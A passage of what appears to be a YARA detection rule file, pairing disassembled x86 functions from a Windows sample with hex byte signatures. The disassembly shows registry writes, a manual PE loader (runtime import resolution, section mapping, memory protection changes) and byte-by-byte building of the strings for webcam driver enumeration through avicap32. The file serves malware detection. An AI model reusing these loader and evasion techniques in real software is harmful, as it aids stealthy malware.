        .text:0x00404c3a  8d4ddc           lea ecx,dword [ebp - 36]
        .text:0x00404c3d  51               push ecx
        .text:0x00404c3e  681f000200       push 0x0002001f
        .text:0x00404c43  53               push ebx
        .text:0x00404c44  8b550c           mov edx,dword [ebp + 12]
        .text:0x00404c47  52               push edx
        .text:0x00404c48  8b4508           mov eax,dword [ebp + 8]
        .text:0x00404c4b  50               push eax
        .text:0x00404c4c  ff1504904000     call dword [0x00409004]    ;advapi32.RegOpenKeyExA(arg0,arg1,0,0x0002001f,local40)
        .text:0x00404c52  85c0             test eax,eax
        .text:0x00404c54  7539             jnz 0x00404c8f
        .text:0x00404c56  8b7d14           mov edi,dword [ebp + 20]
        .text:0x00404c59  3bfb             cmp edi,ebx
        .text:0x00404c5b  7632             jbe 0x00404c8f
        .text:0x00404c5d  83ff02           cmp edi,2
        .text:0x00404c60  772d             ja 0x00404c8f
        .text:0x00404c62  8b7518           mov esi,dword [ebp + 24]
        .text:0x00404c65  56               push esi
        .text:0x00404c66  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00404c6c  e87ffaffff       call 0x004046f0    ;sub_004046f0(arg4)
        .text:0x00404c71  40               inc eax
        .text:0x00404c72  50               push eax
        .text:0x00404c73  56               push esi
        .text:0x00404c74  57               push edi
        .text:0x00404c75  53               push ebx
        .text:0x00404c76  8b4d10           mov ecx,dword [ebp + 16]
        .text:0x00404c79  51               push ecx
        .text:0x00404c7a  8b55dc           mov edx,dword [ebp - 36]
        .text:0x00404c7d  52               push edx
        .text:0x00404c7e  ff1500904000     call dword [0x00409000]    ;advapi32.RegSetValueExA(0xfefefefe,arg2,0,arg3,arg4,sub_004046f0(arg4))
        .text:0x00404c84  85c0             test eax,eax
        .text:0x00404c86  7507             jnz 0x00404c8f
        .text:0x00404c88  c745e401000000   mov dword [ebp - 28],1
        .text:0x00404c8f  loc_00404c8f: [6 XREFS]
        .text:0x00404c8f  c745fcffffffff   mov dword [ebp - 4],0xffffffff
        .text:0x00404c96  e814000000       call 0x00404caf    ;sub_00404caf()
        .text:0x00404c9b  8b45e4           mov eax,dword [ebp - 28]
        .text:0x00404c9e  8b4df0           mov ecx,dword [ebp - 16]
        .text:0x00404ca1  64890d00000000   fs: mov dword [0x00000000],ecx
        .text:0x00404ca8  5f               pop edi
        .text:0x00404ca9  5e               pop esi
        .text:0x00404caa  5b               pop ebx
        .text:0x00404cab  8be5             mov esp,ebp
        .text:0x00404cad  5d               pop ebp
        .text:0x00404cae  c3               ret 
        */
        $c51 = { 55 8B EC 6A FF 68 A8 92 40 00 68 90 7E 40 00 64 A1 ?? ?? ?? ?? 50 64 89 25 ?? ?? ?? ?? 83 EC 14 53 56 57 33 DB 89 5D ?? 89 5D ?? 8B 45 ?? 2B C3 74 ?? 48 74 ?? EB ?? 8D 45 ?? 50 8D 4D ?? 51 53 68 3F 00 0F 00 53 53 53 8B 55 ?? 52 8B 45 ?? 50 FF 15 ?? ?? ?? ?? 85 C0 75 ?? 8D 4D ?? 51 68 1F 00 02 00 53 8B 55 ?? 52 8B 45 ?? 50 FF 15 ?? ?? ?? ?? 85 C0 75 ?? 8B 7D ?? 3B FB 76 ?? 83 FF 02 77 ?? 8B 75 ?? 56 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 40 50 56 57 53 8B 4D ?? 51 8B 55 ?? 52 FF 15 ?? ?? ?? ?? 85 C0 75 ?? C7 45 ?? 01 00 00 00 C7 45 ?? FF FF FF FF E8 ?? ?? ?? ?? 8B 45 ?? 8B 4D ?? 64 89 0D ?? ?? ?? ?? 5F 5E 5B 8B E5 5D C3 }
        /*
function at 0x00404130@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - link function at runtime on Windows
        .text:0x00404130  
        .text:0x00404130  FUNC: int cdecl sub_00404130( int arg0, ) [2 XREFS] 
        .text:0x00404130  
        .text:0x00404130  Stack Variables: (offset from initial top of stack)
        .text:0x00404130             4: int arg0
        .text:0x00404130            -4: int local4
        .text:0x00404130  
        .text:0x00404130  51               push ecx
        .text:0x00404131  53               push ebx
        .text:0x00404132  55               push ebp
        .text:0x00404133  56               push esi
        .text:0x00404134  57               push edi
        .text:0x00404135  8b7c2418         mov edi,dword [esp + 24]
        .text:0x00404139  bb01000000       mov ebx,1
        .text:0x0040413e  8b07             mov eax,dword [edi]
        .text:0x00404140  8b6f04           mov ebp,dword [edi + 4]
        .text:0x00404143  0580000000       add eax,128
        .text:0x00404148  8b4804           mov ecx,dword [eax + 4]
        .text:0x0040414b  85c9             test ecx,ecx
        .text:0x0040414d  0f86da000000     jbe 0x0040422d
        .text:0x00404153  8b30             mov esi,dword [eax]
        .text:0x00404155  6a14             push 20
        .text:0x00404157  03f5             add esi,ebp
        .text:0x00404159  56               push esi
        .text:0x0040415a  89742418         mov dword [esp + 24],esi
        .text:0x0040415e  ff15f0904000     call dword [0x004090f0]    ;kernel32.IsBadReadPtr(0xc2c2c2c2,20)
        .text:0x00404164  85c0             test eax,eax
        .text:0x00404166  0f85c1000000     jnz 0x0040422d
        .text:0x0040416c  loc_0040416c: [1 XREFS]
        .text:0x0040416c  8b460c           mov eax,dword [esi + 12]
        .text:0x0040416f  85c0             test eax,eax
        .text:0x00404171  0f84be000000     jz 0x00404235
        .text:0x00404177  03c5             add eax,ebp
        .text:0x00404179  50               push eax
        .text:0x0040417a  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(0xc2c2c2c2)
        .text:0x00404180  8bd8             mov ebx,eax
        .text:0x00404182  85db             test ebx,ebx
        .text:0x00404184  0f849b000000     jz 0x00404225
        .text:0x0040418a  8b470c           mov eax,dword [edi + 12]
        .text:0x0040418d  8b5708           mov edx,dword [edi + 8]
        .text:0x00404190  8d0c8504000000   lea ecx,dword [0x00000004 + eax * 4]
        .text:0x00404197  51               push ecx
        .text:0x00404198  52               push edx
        .text:0x00404199  e8e63c0000       call 0x00407e84    ;msvcrt.realloc(0x61616161,0x85858588)
        .text:0x0040419e  83c408           add esp,8
        .text:0x004041a1  894708           mov dword [edi + 8],eax
        .text:0x004041a4  85c0             test eax,eax
        .text:0x004041a6  747d             jz 0x00404225
        .text:0x004041a8  8b4f0c           mov ecx,dword [edi + 12]
        .text:0x004041ab  891c88           mov dword [eax + ecx * 4],ebx
        .text:0x004041ae  8b570c           mov edx,dword [edi + 12]
        .text:0x004041b1  42               inc edx
        .text:0x004041b2  89570c           mov dword [edi + 12],edx
        .text:0x004041b5  8b06             mov eax,dword [esi]
        .text:0x004041b7  85c0             test eax,eax
        .text:0x004041b9  740a             jz 0x004041c5
        .text:0x004041bb  8b7610           mov esi,dword [esi + 16]
        .text:0x004041be  8d3c28           lea edi,dword [eax + ebp]
        .text:0x004041c1  03f5             add esi,ebp
        .text:0x004041c3  eb08             jmp 0x004041cd
        .text:0x004041c5  loc_004041c5: [1 XREFS]
        .text:0x004041c5  8b5610           mov edx,dword [esi + 16]
        .text:0x004041c8  8d3c2a           lea edi,dword [edx + ebp]
        .text:0x004041cb  8bf7             mov esi,edi
        .text:0x004041cd  loc_004041cd: [1 XREFS]
        .text:0x004041cd  8b07             mov eax,dword [edi]
        .text:0x004041cf  85c0             test eax,eax
        .text:0x004041d1  742d             jz 0x00404200
        .text:0x004041d3  loc_004041d3: [1 XREFS]
        .text:0x004041d3  a900000080       test eax,0x80000000
        .text:0x004041d8  7407             jz 0x004041e1
        .text:0x004041da  25ffff0000       and eax,0x0000ffff
        .text:0x004041df  eb04             jmp 0x004041e5
        .text:0x004041e1  loc_004041e1: [1 XREFS]
        .text:0x004041e1  8d442802         lea eax,dword [eax + ebp + 2]
        .text:0x004041e5  loc_004041e5: [1 XREFS]
        .text:0x004041e5  50               push eax
        .text:0x004041e6  53               push ebx
        .text:0x004041e7  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(unknownlib,0xc2c2c2c4)
        .text:0x004041ed  85c0             test eax,eax
        .text:0x004041ef  8906             mov dword [esi],eax
        .text:0x004041f1  7432             jz 0x00404225
        .text:0x004041f3  8b4704           mov eax,dword [edi + 4]
        .text:0x004041f6  83c704           add edi,4
        .text:0x004041f9  83c604           add esi,4
        .text:0x004041fc  85c0             test eax,eax
        .text:0x004041fe  75d3             jnz 0x004041d3
        .text:0x00404200  loc_00404200: [1 XREFS]
        .text:0x00404200  8b442410         mov eax,dword [esp + 16]
        .text:0x00404204  6a14             push 20
        .text:0x00404206  83c014           add eax,20
        .text:0x00404209  50               push eax
        .text:0x0040420a  89442418         mov dword [esp + 24],eax
        .text:0x0040420e  ff15f0904000     call dword [0x004090f0]    ;kernel32.IsBadReadPtr(0xc2c2c2d6,20)
        .text:0x00404214  85c0             test eax,eax
        .text:0x00404216  751d             jnz 0x00404235
        .text:0x00404218  8b7c2418         mov edi,dword [esp + 24]
        .text:0x0040421c  8b742410         mov esi,dword [esp + 16]
        .text:0x00404220  e947ffffff       jmp 0x0040416c
        .text:0x00404225  loc_00404225: [3 XREFS]
        .text:0x00404225  5f               pop edi
        .text:0x00404226  5e               pop esi
        .text:0x00404227  5d               pop ebp
        .text:0x00404228  33c0             xor eax,eax
        .text:0x0040422a  5b               pop ebx
        .text:0x0040422b  59               pop ecx
        .text:0x0040422c  c3               ret 
        .text:0x0040422d  loc_0040422d: [2 XREFS]
        .text:0x0040422d  5f               pop edi
        .text:0x0040422e  5e               pop esi
        .text:0x0040422f  8bc3             mov eax,ebx
        .text:0x00404231  5d               pop ebp
        .text:0x00404232  5b               pop ebx
        .text:0x00404233  59               pop ecx
        .text:0x00404234  c3               ret 
        .text:0x00404235  loc_00404235: [2 XREFS]
        .text:0x00404235  5f               pop edi
        .text:0x00404236  5e               pop esi
        .text:0x00404237  5d               pop ebp
        .text:0x00404238  b801000000       mov eax,1
        .text:0x0040423d  5b               pop ebx
        .text:0x0040423e  59               pop ecx
        .text:0x0040423f  c3               ret 
        */
        $c52 = { 51 53 55 56 57 8B 7C 24 ?? BB 01 00 00 00 8B 07 8B 6F ?? 05 80 00 00 00 8B 48 ?? 85 C9 0F 86 ?? ?? ?? ?? 8B 30 6A 14 03 F5 56 89 74 24 ?? FF 15 ?? ?? ?? ?? 85 C0 0F 85 ?? ?? ?? ?? 8B 46 ?? 85 C0 0F 84 ?? ?? ?? ?? 03 C5 50 FF 15 ?? ?? ?? ?? 8B D8 85 DB 0F 84 ?? ?? ?? ?? 8B 47 ?? 8B 57 ?? 8D 0C 85 ?? ?? ?? ?? 51 52 E8 ?? ?? ?? ?? 83 C4 08 89 47 ?? 85 C0 74 ?? 8B 4F ?? 89 1C 88 8B 57 ?? 42 89 57 ?? 8B 06 85 C0 74 ?? 8B 76 ?? 8D 3C 28 03 F5 EB ?? 8B 56 ?? 8D 3C 2A 8B F7 8B 07 85 C0 74 ?? A9 00 00 00 80 74 ?? 25 FF FF 00 00 EB ?? 8D 44 28 ?? 50 53 FF 15 ?? ?? ?? ?? 85 C0 89 06 74 ?? 8B 47 ?? 83 C7 04 83 C6 04 85 C0 75 ?? 8B 44 24 ?? 6A 14 83 C0 14 50 89 44 24 ?? FF 15 ?? ?? ?? ?? 85 C0 75 ?? 8B 7C 24 ?? 8B 74 24 ?? E9 ?? ?? ?? ?? 5F 5E 5D 33 C0 5B 59 C3 5F 5E 8B C3 5D 5B 59 C3 5F 5E 5D B8 01 00 00 00 5B 59 C3 }
        /*
function at 0x00404e40@9324d1a8ae37a36ae560c37448c9705a with 2 features:
          - link function at runtime on Windows
          - resolve function by parsing PE exports
        .text:0x00404e40  
        .text:0x00404e40  FUNC: int cdecl sub_00404e40( ) [2 XREFS] 
        .text:0x00404e40  
        .text:0x00404e40  Stack Variables: (offset from initial top of stack)
        .text:0x00404e40          -100: int local100
        .text:0x00404e40          -152: int local152
        .text:0x00404e40          -156: int local156
        .text:0x00404e40          -157: int local157
        .text:0x00404e40          -158: int local158
        .text:0x00404e40          -159: int local159
        .text:0x00404e40          -160: int local160
        .text:0x00404e40          -161: int local161
        .text:0x00404e40          -162: int local162
        .text:0x00404e40          -163: int local163
        .text:0x00404e40          -164: int local164
        .text:0x00404e40          -165: int local165
        .text:0x00404e40          -166: int local166
        .text:0x00404e40          -167: int local167
        .text:0x00404e40          -168: int local168
        .text:0x00404e40          -169: int local169
        .text:0x00404e40          -170: int local170
        .text:0x00404e40          -171: int local171
        .text:0x00404e40          -172: int local172
        .text:0x00404e40          -173: int local173
        .text:0x00404e40          -174: int local174
        .text:0x00404e40          -175: int local175
        .text:0x00404e40          -176: int local176
        .text:0x00404e40          -177: int local177
        .text:0x00404e40          -178: int local178
        .text:0x00404e40          -179: int local179
        .text:0x00404e40          -180: int local180
        .text:0x00404e40          -184: int local184
        .text:0x00404e40          -185: int local185
        .text:0x00404e40          -186: int local186
        .text:0x00404e40          -187: int local187
        .text:0x00404e40          -188: int local188
        .text:0x00404e40          -189: int local189
        .text:0x00404e40          -190: int local190
        .text:0x00404e40          -191: int local191
        .text:0x00404e40          -192: int local192
        .text:0x00404e40          -193: int local193
        .text:0x00404e40          -194: int local194
        .text:0x00404e40          -195: int local195
        .text:0x00404e40          -196: int local196
        .text:0x00404e40  
        .text:0x00404e40  81ecc4000000     sub esp,196
        .text:0x00404e46  53               push ebx
        .text:0x00404e47  55               push ebp
        .text:0x00404e48  8b2d78904000     mov ebp,dword [0x00409078]
        .text:0x00404e4e  56               push esi
        .text:0x00404e4f  b06c             mov al,108
        .text:0x00404e51  57               push edi
        .text:0x00404e52  33ff             xor edi,edi
        .text:0x00404e54  8844241a         mov byte [esp + 26],al
        .text:0x00404e58  8844241b         mov byte [esp + 27],al
        .text:0x00404e5c  b341             mov bl,65
        .text:0x00404e5e  b265             mov dl,101
        .text:0x00404e60  b172             mov cl,114
        .text:0x00404e62  b069             mov al,105
        .text:0x00404e64  57               push edi
        .text:0x00404e65  885c2414         mov byte [esp + 20],bl
        .text:0x00404e69  c644241556       mov byte [esp + 21],86
        .text:0x00404e6e  c644241649       mov byte [esp + 22],73
        .text:0x00404e73  c644241743       mov byte [esp + 23],67
        .text:0x00404e78  885c2418         mov byte [esp + 24],bl
        .text:0x00404e7c  c644241950       mov byte [esp + 25],80
        .text:0x00404e81  c644241a33       mov byte [esp + 26],51
        .text:0x00404e86  c644241b32       mov byte [esp + 27],50
        .text:0x00404e8b  c644241c2e       mov byte [esp + 28],46
        .text:0x00404e90  c644241d64       mov byte [esp + 29],100
        .text:0x00404e95  c644242000       mov byte [esp + 32],0
        .text:0x00404e9a  c644242463       mov byte [esp + 36],99
        .text:0x00404e9f  c644242561       mov byte [esp + 37],97
        .text:0x00404ea4  c644242670       mov byte [esp + 38],112
        .text:0x00404ea9  c644242747       mov byte [esp + 39],71
        .text:0x00404eae  88542428         mov byte [esp + 40],dl
        .text:0x00404eb2  c644242974       mov byte [esp + 41],116
        .text:0x00404eb7  c644242a44       mov byte [esp + 42],68
        .text:0x00404ebc  884c242b         mov byte [esp + 43],cl
        .text:0x00404ec0  8844242c         mov byte [esp + 44],al
        .text:0x00404ec4  c644242d76       mov byte [esp + 45],118
        .text:0x00404ec9  8854242e         mov byte [esp + 46],dl
        .text:0x00404ecd  884c242f         mov byte [esp + 47],cl
        .text:0x00404ed1  c644243044       mov byte [esp + 48],68
        .text:0x00404ed6  88542431         mov byte [esp + 49],dl
        .text:0x00404eda  c644243273       mov byte [esp + 50],115
        .text:0x00404edf  c644243363       mov byte [esp + 51],99
        .text:0x00404ee4  884c2434         mov byte [esp + 52],cl
        .text:0x00404ee8  88442435         mov byte [esp + 53],al
        .text:0x00404eec  c644243670       mov byte [esp + 54],112
        .text:0x00404ef1  c644243774       mov byte [esp + 55],116
        .text:0x00404ef6  88442438         mov byte [esp + 56],al
        .text:0x00404efa  c64424396f       mov byte [esp + 57],111
        .text:0x00404eff  c644243a6e       mov byte [esp + 58],110
        .text:0x00404f04  885c243b         mov byte [esp + 59],bl
        .text:0x00404f08  c644243c00       mov byte [esp + 60],0
        .text:0x00404f0d  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00404f0f  8d442420         lea eax,dword [esp + 32]
        .text:0x00404f13  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00404f17  50               push eax
        .text:0x00404f18  51               push ecx
        .text:0x00404f19  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(local196)
        .text:0x00404f1f  50               push eax
        .text:0x00404f20  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(avicap32,local180)
        .text:0x00404f26  8bd8             mov ebx,eax
        .text:0x00404f28  33f6             xor esi,esi
        .text:0x00404f2a  loc_00404f2a: [1 XREFS]
        .text:0x00404f2a  85ff             test edi,edi
        .text:0x00404f2c  751c             jnz 0x00404f4a
        .text:0x00404f2e  57               push edi
        .text:0x00404f2f  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00404f31  8d54243c         lea edx,dword [esp + 60]
        .text:0x00404f35  6a32             push 50
        .text:0x00404f37  52               push edx
        .text:0x00404f38  8d442478         lea eax,dword [esp + 120]
        .text:0x00404f3c  6a64             push 100
        .text:0x00404f3e  50               push eax
        .text:0x00404f3f  56               push esi
        .text:0x00404f40  ffd3             call ebx    ;UnknownApi()
        .text:0x00404f42  46               inc esi
        .text:0x00404f43  8bf8             mov edi,eax
        .text:0x00404f45  83fe0a           cmp esi,10
        .text:0x00404f48  7ce0             jl 0x00404f2a
        .text:0x00404f4a  loc_00404f4a: [1 XREFS]
        .text:0x00404f4a  6a00             push 0
        .text:0x00404f4c  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00404f4e  8bc7             mov eax,edi
        .text:0x00404f50  5f               pop edi
        .text:0x00404f51  5e               pop esi
        .text:0x00404f52  5d               pop ebp
        .text:0x00404f53  5b               pop ebx
        .text:0x00404f54  81c4c4000000     add esp,196
        .text:0x00404f5a  c3               ret 
        */
        $c53 = { 81 EC C4 00 00 00 53 55 8B 2D ?? ?? ?? ?? 56 B0 6C 57 33 FF 88 44 24 ?? 88 44 24 ?? B3 41 B2 65 B1 72 B0 69 57 88 5C 24 ?? C6 44 24 ?? 56 C6 44 24 ?? 49 C6 44 24 ?? 43 88 5C 24 ?? C6 44 24 ?? 50 C6 44 24 ?? 33 C6 44 24 ?? 32 C6 44 24 ?? 2E C6 44 24 ?? 64 C6 44 24 ?? 00 C6 44 24 ?? 63 C6 44 24 ?? 61 C6 44 24 ?? 70 C6 44 24 ?? 47 88 54 24 ?? C6 44 24 ?? 74 C6 44 24 ?? 44 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 76 88 54 24 ?? 88 4C 24 ?? C6 44 24 ?? 44 88 54 24 ?? C6 44 24 ?? 73 C6 44 24 ?? 63 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 70 C6 44 24 ?? 74 88 44 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 6E 88 5C 24 ?? C6 44 24 ?? 00 FF D5 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 8B D8 33 F6 85 FF 75 ?? 57 FF D5 8D 54 24 ?? 6A 32 52 8D 44 24 ?? 6A 64 50 56 FF D3 46 8B F8 83 FE 0A 7C ?? 6A 00 FF D5 8B C7 5F 5E 5D 5B 81 C4 C4 00 00 00 C3 }
        /*
function at 0x00403f20@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - enumerate PE sections
        .text:0x00403f20  
        .text:0x00403f20  FUNC: int cdecl sub_00403f20( int arg0, int arg1, int arg2, ) [2 XREFS] 
        .text:0x00403f20  
        .text:0x00403f20  Stack Variables: (offset from initial top of stack)
        .text:0x00403f20            12: int arg2
        .text:0x00403f20             8: int arg1
        .text:0x00403f20             4: int arg0
        .text:0x00403f20            -4: int local4
        .text:0x00403f20  
        .text:0x00403f20  51               push ecx
        .text:0x00403f21  8b442410         mov eax,dword [esp + 16]
        .text:0x00403f25  55               push ebp
        .text:0x00403f26  33c9             xor ecx,ecx
        .text:0x00403f28  56               push esi
        .text:0x00403f29  8b6804           mov ebp,dword [eax + 4]
        .text:0x00403f2c  8b00             mov eax,dword [eax]
        .text:0x00403f2e  c744240800000000 mov dword [esp + 8],0
        .text:0x00403f36  668b4814         mov cx,word [eax + 20]
        .text:0x00403f3a  6683780600       cmp word [eax + 6],0
        .text:0x00403f3f  8d740118         lea esi,dword [ecx + eax + 24]
        .text:0x00403f43  0f8698000000     jbe 0x00403fe1
        .text:0x00403f49  53               push ebx
        .text:0x00403f4a  57               push edi
        .text:0x00403f4b  83c610           add esi,16
        .text:0x00403f4e  loc_00403f4e: [1 XREFS]
        .text:0x00403f4e  833e00           cmp dword [esi],0
        .text:0x00403f51  7538             jnz 0x00403f8b
        .text:0x00403f53  8b54241c         mov edx,dword [esp + 28]
        .text:0x00403f57  8b5a38           mov ebx,dword [edx + 56]
        .text:0x00403f5a  85db             test ebx,ebx
        .text:0x00403f5c  7e61             jle 0x00403fbf
        .text:0x00403f5e  8b46fc           mov eax,dword [esi - 4]
        .text:0x00403f61  6a04             push 4
        .text:0x00403f63  6800100000       push 0x00001000
        .text:0x00403f68  03c5             add eax,ebp
        .text:0x00403f6a  53               push ebx
        .text:0x00403f6b  50               push eax
        .text:0x00403f6c  ff1580904000     call dword [0x00409080]    ;kernel32.VirtualAlloc(0xc2c2c2c2,0x61616161,0x00001000,4)
        .text:0x00403f72  8bcb             mov ecx,ebx
        .text:0x00403f74  8bf8             mov edi,eax
        .text:0x00403f76  8bd1             mov edx,ecx
        .text:0x00403f78  33c0             xor eax,eax
        .text:0x00403f7a  c1e902           shr ecx,2
        .text:0x00403f7d  897ef8           mov dword [esi - 8],edi
        .text:0x00403f80  f3ab             rep: stosd 
        .text:0x00403f82  8bca             mov ecx,edx
        .text:0x00403f84  83e103           and ecx,3
        .text:0x00403f87  f3aa             rep: stosb 
        .text:0x00403f89  eb34             jmp 0x00403fbf
        .text:0x00403f8b  loc_00403f8b: [1 XREFS]
        .text:0x00403f8b  8b4efc           mov ecx,dword [esi - 4]
        .text:0x00403f8e  8b06             mov eax,dword [esi]
        .text:0x00403f90  6a04             push 4
        .text:0x00403f92  6800100000       push 0x00001000
        .text:0x00403f97  03cd             add ecx,ebp
        .text:0x00403f99  50               push eax
        .text:0x00403f9a  51               push ecx
        .text:0x00403f9b  ff1580904000     call dword [0x00409080]    ;kernel32.VirtualAlloc(0xc2c2c2c2,0x61616161,0x00001000,4)
        .text:0x00403fa1  8b16             mov edx,dword [esi]
        .text:0x00403fa3  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00403fa9  8bf8             mov edi,eax
        .text:0x00403fab  8b4604           mov eax,dword [esi + 4]
        .text:0x00403fae  52               push edx
        .text:0x00403faf  8b54241c         mov edx,dword [esp + 28]
        .text:0x00403fb3  03c2             add eax,edx
        .text:0x00403fb5  50               push eax
        .text:0x00403fb6  57               push edi
        .text:0x00403fb7  e8a4050000       call 0x00404560    ;sub_00404560(kernel32.VirtualAlloc(0xc2c2c2c2,0x61616161,0x00001000,4),0xa2b87170,0x61616161)
        .text:0x00403fbc  897ef8           mov dword [esi - 8],edi
        .text:0x00403fbf  loc_00403fbf: [2 XREFS]
        .text:0x00403fbf  8b4c2420         mov ecx,dword [esp + 32]
        .text:0x00403fc3  8b442410         mov eax,dword [esp + 16]
        .text:0x00403fc7  40               inc eax
        .text:0x00403fc8  83c628           add esi,40
        .text:0x00403fcb  8b11             mov edx,dword [ecx]
        .text:0x00403fcd  33c9             xor ecx,ecx
        .text:0x00403fcf  89442410         mov dword [esp + 16],eax
        .text:0x00403fd3  668b4a06         mov cx,word [edx + 6]
        .text:0x00403fd7  3bc1             cmp eax,ecx
        .text:0x00403fd9  0f8c6fffffff     jl 0x00403f4e
        .text:0x00403fdf  5f               pop edi
        .text:0x00403fe0  5b               pop ebx
        .text:0x00403fe1  loc_00403fe1: [1 XREFS]
        .text:0x00403fe1  5e               pop esi
        .text:0x00403fe2  5d               pop ebp
        .text:0x00403fe3  59               pop ecx
        .text:0x00403fe4  c3               ret 
        */
        $c54 = { 51 8B 44 24 ?? 55 33 C9 56 8B 68 ?? 8B 00 C7 44 24 ?? 00 00 00 00 66 8B 48 ?? 66 83 78 ?? 00 8D 74 01 ?? 0F 86 ?? ?? ?? ?? 53 57 83 C6 10 83 3E 00 75 ?? 8B 54 24 ?? 8B 5A ?? 85 DB 7E ?? 8B 46 ?? 6A 04 68 00 10 00 00 03 C5 53 50 FF 15 ?? ?? ?? ?? 8B CB 8B F8 8B D1 33 C0 C1 E9 02 89 7E ?? F3 AB 8B CA 83 E1 03 F3 AA EB ?? 8B 4E ?? 8B 06 6A 04 68 00 10 00 00 03 CD 50 51 FF 15 ?? ?? ?? ?? 8B 16 8B 0D ?? ?? ?? ?? 8B F8 8B 46 ?? 52 8B 54 24 ?? 03 C2 50 57 E8 ?? ?? ?? ?? 89 7E ?? 8B 4C 24 ?? 8B 44 24 ?? 40 83 C6 28 8B 11 33 C9 89 44 24 ?? 66 8B 4A ?? 3B C1 0F 8C ?? ?? ?? ?? 5F 5B 5E 5D 59 C3 }
        /*
function at 0x00403ff0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - enumerate PE sections
        .text:0x00403ff0  
        .text:0x00403ff0  FUNC: int cdecl sub_00403ff0( int arg0, ) [2 XREFS] 
        .text:0x00403ff0  
        .text:0x00403ff0  Stack Variables: (offset from initial top of stack)
        .text:0x00403ff0             4: int arg0
        .text:0x00403ff0            -4: int local4
        .text:0x00403ff0  
        .text:0x00403ff0  51               push ecx
        .text:0x00403ff1  8b442408         mov eax,dword [esp + 8]
        .text:0x00403ff5  53               push ebx
        .text:0x00403ff6  33c9             xor ecx,ecx
        .text:0x00403ff8  55               push ebp
        .text:0x00403ff9  8b18             mov ebx,dword [eax]
        .text:0x00403ffb  33ed             xor ebp,ebp
        .text:0x00403ffd  668b4b14         mov cx,word [ebx + 20]
        .text:0x00404001  66396b06         cmp word [ebx + 6],bp
        .text:0x00404005  8d441918         lea eax,dword [ecx + ebx + 24]
        .text:0x00404009  0f8695000000     jbe 0x004040a4
        .text:0x0040400f  56               push esi
        .text:0x00404010  57               push edi
        .text:0x00404011  8d7824           lea edi,dword [eax + 36]
        .text:0x00404014  loc_00404014: [1 XREFS]
        .text:0x00404014  8b07             mov eax,dword [edi]
        .text:0x00404016  8bc8             mov ecx,eax
        .text:0x00404018  8bd0             mov edx,eax
        .text:0x0040401a  c1e91d           shr ecx,29
        .text:0x0040401d  c1ea1e           shr edx,30
        .text:0x00404020  8bf0             mov esi,eax
        .text:0x00404022  83e101           and ecx,1
        .text:0x00404025  83e201           and edx,1
        .text:0x00404028  c1ee1f           shr esi,31
        .text:0x0040402b  a900000002       test eax,0x02000000
        .text:0x00404030  7415             jz 0x00404047
        .text:0x00404032  8b57ec           mov edx,dword [edi - 20]
        .text:0x00404035  8b47e4           mov eax,dword [edi - 28]
        .text:0x00404038  6800400000       push 0x00004000
        .text:0x0040403d  52               push edx
        .text:0x0040403e  50               push eax
        .text:0x0040403f  ff1570904000     call dword [0x00409070]    ;kernel32.VirtualFree(0x61616161,0x61616161,0x00004000)
        .text:0x00404045  eb43             jmp 0x0040408a
        .text:0x00404047  loc_00404047: [1 XREFS]
        .text:0x00404047  8d0c4a           lea ecx,dword [edx + ecx * 2]
        .text:0x0040404a  a900000004       test eax,0x04000000
        .text:0x0040404f  8d144e           lea edx,dword [esi + ecx * 2]
        .text:0x00404052  8b149550a04000   mov edx,dword [0x0040a050 + edx * 4]
        .text:0x00404059  7403             jz 0x0040405e
        .text:0x0040405b  80ce02           or dh,2
        .text:0x0040405e  loc_0040405e: [1 XREFS]
        .text:0x0040405e  8b4fec           mov ecx,dword [edi - 20]
        .text:0x00404061  85c9             test ecx,ecx
        .text:0x00404063  7512             jnz 0x00404077
        .text:0x00404065  a840             test al,64
        .text:0x00404067  7405             jz 0x0040406e
        .text:0x00404069  8b4b20           mov ecx,dword [ebx + 32]
        .text:0x0040406c  eb07             jmp 0x00404075
        .text:0x0040406e  loc_0040406e: [1 XREFS]
        .text:0x0040406e  a880             test al,128
        .text:0x00404070  7418             jz 0x0040408a
        .text:0x00404072  8b4b24           mov ecx,dword [ebx + 36]
        .text:0x00404075  loc_00404075: [1 XREFS]
        .text:0x00404075  85c9             test ecx,ecx
        .text:0x00404077  loc_00404077: [1 XREFS]
        .text:0x00404077  7611             jbe 0x0040408a
        .text:0x00404079  8d442410         lea eax,dword [esp + 16]
        .text:0x0040407d  50               push eax
        .text:0x0040407e  52               push edx
        .text:0x0040407f  51               push ecx
        .text:0x00404080  8b4fe4           mov ecx,dword [edi - 28]
        .text:0x00404083  51               push ecx
        .text:0x00404084  ff15e4904000     call dword [0x004090e4]    ;kernel32.VirtualProtect(0x61616161,0x61616161,32,local4)
        .text:0x0040408a  loc_0040408a: [3 XREFS]
        .text:0x0040408a  8b542418         mov edx,dword [esp + 24]
        .text:0x0040408e  33c0             xor eax,eax
        .text:0x00404090  45               inc ebp
        .text:0x00404091  83c728           add edi,40
        .text:0x00404094  8b1a             mov ebx,dword [edx]
        .text:0x00404096  668b4306         mov ax,word [ebx + 6]
        .text:0x0040409a  3be8             cmp ebp,eax
        .text:0x0040409c  0f8c72ffffff     jl 0x00404014
        .text:0x004040a2  5f               pop edi
        .text:0x004040a3  5e               pop esi
        .text:0x004040a4  loc_004040a4: [1 XREFS]
        .text:0x004040a4  5d               pop ebp
        .text:0x004040a5  5b               pop ebx
        .text:0x004040a6  59               pop ecx
        .text:0x004040a7  c3               ret 
        */
